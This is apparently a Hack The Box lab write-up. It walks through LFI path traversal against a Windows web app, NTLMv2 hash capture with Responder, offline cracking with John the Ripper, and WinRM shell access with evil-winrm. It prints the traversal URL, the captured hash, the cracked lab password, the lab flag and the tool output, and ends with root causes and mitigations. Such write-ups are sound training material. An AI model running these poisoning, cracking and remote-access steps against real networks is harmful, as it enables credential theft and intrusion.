**Platform:** Hack The Box — Starting Point (Tier 1)
**Difficulty:** Very Easy
**Category:** LFI / NTLM Hash Capture / Credential Cracking
**Tags:**  Windows, LFI LLMNR/NBT-NS Poisoning, NTLMv2 John the Ripper, WinRM, evil-winrm

---

## Overview

Responder is a Starting Point machine that walks through a classic Windows attack chain: discovering a Local File Inclusion (LFI) vulnerability on a web app, using it to trigger the target into authenticating to an attacker-controlled listener, capturing an NTLMv2 hash with the `Responder` tool, cracking that hash offline, and using the recovered credentials to gain remote access via WinRM.

## Methodology

### 1. Reconnaissance

- Connected to the HTB VPN and confirmed connectivity to the target with a ping.

!image.png

```bash
ping 10.129.172.181
PING 10.129.172.181 (10.129.172.181) 56(84) bytes of data.
64 bytes from 10.129.172.181: icmp_seq=1 ttl=127 time=341 ms
64 bytes from 10.129.172.181: icmp_seq=2 ttl=127 time=228 ms
64 bytes from 10.129.172.181: icmp_seq=3 ttl=127 time=202 ms
64 bytes from 10.129.172.181: icmp_seq=4 ttl=127 time=358 ms
64 bytes from 10.129.172.181: icmp_seq=5 ttl=127 time=223 ms
^C
--- 10.129.172.181 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4008ms
rtt min/avg/max/mdev = 202.345/270.446/358.317/65.339 ms

```

- Ran an Nmap scan to enumerate open ports and services:
    
    ```bash
    sudo nmap -p- --min-rate 1000 -sC -sV 10.129.172.181
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-08 07:11 -0400
    Nmap scan report for 10.129.172.181
    Host is up (0.22s latency).
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
    |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    7680/tcp open  pando-pub?
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 192.61 seconds
    
    ```
    
- Identified a web service on port 80, along with typical Windows AD-adjacent ports.

### 2. Web Enumeration

- Browsed to the target's IP over HTTP and observed a redirect to a hostname unika.htb  that would not resolve.
- Added an entry for the target IP and hostname to the local hosts file (`/etc/hosts`) to allow the redirect to resolve properly.

```bash
echo "10.129.172.181 unika.htb" >> /etc/hosts

sudo nano /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.147.74   thetoppers.htb
10.129.147.74   s3.thetoppers.htb
10.129.172.181 unika.htb

```

- Reloaded the site and reviewed its functionality, noting a language-selection parameter in the URL (e.g., a `page=` or similar parameter referencing template files such as `french.html`).

!image.png

### 3. Vulnerability Identification — LFI

- Tested the language/page parameter by substituting known Windows file paths, confirming that the application was including local files based on unsanitized user input — a Local File Inclusion vulnerability.

```bash
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

!image.png

- Recognized that this class of vulnerability could be leveraged to coerce the underlying Windows host into making outbound authentication requests (e.g., via a UNC path), rather than just reading local files.

### 4. Setting Up the Capture — Responder

- Identified the correct network interface for the HTB VPN tunnel.
- Started Responder to listen for LLMNR/NBT-NS/mDNS name resolution requests and stand up rogue SMB/HTTP listeners:
    
    ```bash
    git clone https://github.com/lgandx/Responder
    Cloning into 'Responder'...
    remote: Enumerating objects: 2791, done.
    remote: Counting objects: 100% (1644/1644), done.
    remote: Compressing objects: 100% (452/452), done.
    remote: Total 2791 (delta 1225), reused 1193 (delta 1192), pack-reused 1147 (from 1)
    Receiving objects: 100% (2791/2791), 2.70 MiB | 733.00 KiB/s, done.
    Resolving deltas: 100% (1802/1802), done.
    
    ```
    

```bash
cat Responder.conf
[Responder Core]

; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

#IPv6 conf:
DHCPv6 = Off

; Servers to start
SQL      = On
SMB      = On
QUIC     = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On

[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key

```

- Used the LFI vulnerability to make the target attempt to resolve/authenticate to the attacker's IP (e.g., by pointing the vulnerable parameter at a UNC-style path pointing back to the attacker's machine), triggering the target to send NTLM authentication data.

### 5. Capturing the Hash

- Monitored the Responder output and observed an incoming NTLMv2 challenge/response for a user account, including the client IP, username, and hashed credential material.

```bash
sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.212]
    Responder IPv6             [fe80::4b11:fd5b:5518:2b6b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-L0L223OIFUI]
    Responder Domain Name      [4ET8.LOCAL]
    Responder DCE-RPC Port     [45293]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                

[!] Error starting TCP server on port 80, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.172.181
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:6ef9d0b99badfacd:66475FD58CD2578DDD63E940A68D24E8:
0101000000000000802C61ACB20EDD01A77AE44B48B03DC60000000002000800340045005400380001001E00570049004E002D00
4C0030004C003200320033004F00490046005500490004003400570049004E002D004C0030004C003200320033004F0049004600
550049002E0034004500540038002E004C004F00430041004C000300140034004500540038002E004C004F00430041004C000500
140034004500540038002E004C004F00430041004C0007000800802C61ACB20EDD01060004000200000008003000300000000000
0000010000000020000055AAA6923B2C4159E41C57DC5938D271CABE61BD3D757E78FC74975C719741CC0A001000000000000000
000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E0032003100320000000000
00000000  
```

- Copied the captured NetNTLMv2 hash and saved it to a local file for offline cracking.

```bash
[SMB] NTLMv2-SSP Client   : 10.129.172.181
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:6ef9d0b99badfacd:66475FD58CD2578DDD63E940A68D24E8:
0101000000000000802C61ACB20EDD01A77AE44B48B03DC60000000002000800340045005400380001001E00570049004E002D00
4C0030004C003200320033004F00490046005500490004003400570049004E002D004C0030004C003200320033004F0049004600
550049002E0034004500540038002E004C004F00430041004C000300140034004500540038002E004C004F00430041004C000500
140034004500540038002E004C004F00430041004C0007000800802C61ACB20EDD01060004000200000008003000300000000000
0000010000000020000055AAA6923B2C4159E41C57DC5938D271CABE61BD3D757E78FC74975C719741CC0A001000000000000000
000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E0032003100320000000000
00000000  
```

### 6. Cracking the Hash

- Used a common password wordlist (e.g., `rockyou.txt`) with John the Ripper to attempt to crack the captured hash:
    
    ```bash
    sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    badminton        (Administrator)     
    1g 0:00:00:00 DONE (2026-07-08 08:59) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed. 
    
    ```
    
- Recovered the cleartext password for the captured account once a matching candidate was found.

```python
badminton        (Administrator) 
```

!image.png

### 7. Gaining Access — WinRM

- Confirmed that the target exposed the WinRM service (TCP port 5985).
- Used the recovered username and password to authenticate remotely with `evil-winrm`:
    
    ```bash
    sudo evil-winrm -u administrator -p badminton -i 10.129.172.181
                                            
    Evil-WinRM shell v3.9
                                            
    Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                      
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                 
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\Administrator\Documents> 
    
    ```
    
- Obtained an interactive shell on the target host.

### 8. Post-Exploitation

- Navigated the target filesystem using standard shell commands (`cd`, `dir`) within the WinRM session.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../..
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public

*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls

    Directory: C:\Users\mike

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop

*Evil-WinRM* PS C:\Users\mike> cd Destop
Cannot find path 'C:\Users\mike\Destop' because it does not exist.
At line:1 char:1
+ cd Destop
+ ~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\mike\Destop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> ls

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

```

- Located and retrieved the flag from the compromised user's directory, confirming full completion of the lab.

```bash
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
*Evil-WinRM* PS C:\Users\mike\Desktop> 

```

!image.png

## Root Cause

- **Local File Inclusion:** the web application allowed user-controlled input to influence which file/path was loaded, without proper validation, sanitization, or path restriction.
- **LLMNR/NBT-NS poisoning exposure:** the Windows host fell back to broadcast-based name resolution and NTLM authentication when triggered, allowing an attacker on the same network segment to capture authentication material.
- **Weak password policy:** the captured NTLMv2 hash was crackable against a common wordlist, indicating an insufficiently complex password.

## Impact

An attacker with only network-level access and no valid credentials was able to chain a web-layer LFI vulnerability into a full network-layer credential capture, recover a working plaintext password, and ultimately obtain interactive remote access to the host — demonstrating how a single low-severity web bug can escalate into a complete compromise when combined with insecure Windows network defaults.

## Recommendations

- **Sanitize and restrict file-inclusion parameters** on the web application; use allow-lists of permitted files/paths rather than accepting arbitrary user input.
- **Disable LLMNR and NBT-NS** where not required, via Group Policy or local network adapter settings, to remove the fallback name-resolution attack surface.
- **Enforce SMB signing** to mitigate relay-style attacks even if poisoning occurs.
- **Enforce a strong password policy** and/or move toward Kerberos-only authentication to reduce the value of captured NTLM material.
- **Restrict/monitor WinRM access** (e.g., firewall rules, account lockout policies, alerting on unusual authentication) to limit the blast radius of a single compromised credential.

## Tools Used

- Nmap — service enumeration
- Web browser / manual testing — LFI discovery
- Responder — LLMNR/NBT-NS poisoning and NTLMv2 hash capture
- John the Ripper — offline hash cracking
- evil-winrm — remote shell access via WinRM

## Conclusion

Responder is a strong introduction to Windows-focused attack chains, showing how a web application flaw (LFI) can be used as a trigger to abuse insecure Windows name-resolution defaults, how NTLMv2 hash capture and cracking works in practice, and how a single set of recovered credentials can lead directly to remote code execution via WinRM. It reinforces the value of defense in depth — fixing the web bug alone would not have been sufficient without also hardening the underlying network authentication behavior.
